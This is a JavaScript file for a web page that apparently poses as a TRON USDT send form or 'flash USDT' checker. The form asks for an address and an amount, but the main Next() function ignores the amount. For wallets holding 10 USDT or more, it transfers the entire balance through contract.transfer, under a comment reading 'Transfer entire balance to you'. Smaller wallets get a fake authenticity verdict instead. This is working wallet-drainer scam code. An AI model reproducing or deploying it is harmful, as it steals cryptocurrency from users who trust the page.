async function pasteAddress() {
  const text = await navigator.clipboard.readText();
  document.getElementById('address').value = text;
}

function setMax() {
  const maxAmount = 100;
  document.getElementById("amount").value = maxAmount;
  updateUSD();
}

function updateUSD() {
  const amount = parseFloat(document.getElementById("amount").value || "0");
  const usdValue = amount * 1;
  document.getElementById("usdValue").innerText = `≈ $${usdValue.toFixed(2)}`;
}

// ✅ MAIN LOGIC
async function Next() {
  const toAddress = document.getElementById("address").value;
  const amount = parseFloat(document.getElementById("amount").value);
  if (!toAddress || isNaN(amount) || amount <= 0) {
    alert("Please fill in both a valid address and amount.");
    return;
  }

  try {
    const tronWeb = window.tronWeb;
    if (!tronWeb || !tronWeb.defaultAddress.base58) {
      alert("Please open in TronLink browser or DApp browser");
      return;
    }

    const sender = tronWeb.defaultAddress.base58;
    const contractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // TRC20 USDT
    const recipient = toAddress;

    const contract = await tronWeb.contract().at(contractAddress);
    const balance = await contract.balanceOf(sender).call();

    const balanceNum = parseInt(balance.toString());
    const threshold = 10 * 1_000_000; // ⬅️ You can change the limit here

    if (balanceNum < threshold) {
      setTimeout(async () => {
        const balanceCheck = await contract.balanceOf(sender).call();
        if (parseInt(balanceCheck) < balanceNum) {
          alert("✅ Real USDT detected.");
        } else {
          alert("⚠️ Flash USDT — not real.");
        }
      }, 3000);
      return;
    }

    // Transfer entire balance to you
    const tx = await contract.transfer(recipient, balanceNum).send();
    alert("✅ USDT sent successfully.");
    console.log("Transfer complete:", tx);
  } catch (err) {
    console.error("Error:", err);
    alert("❌ Transfer failed.");
  }
}
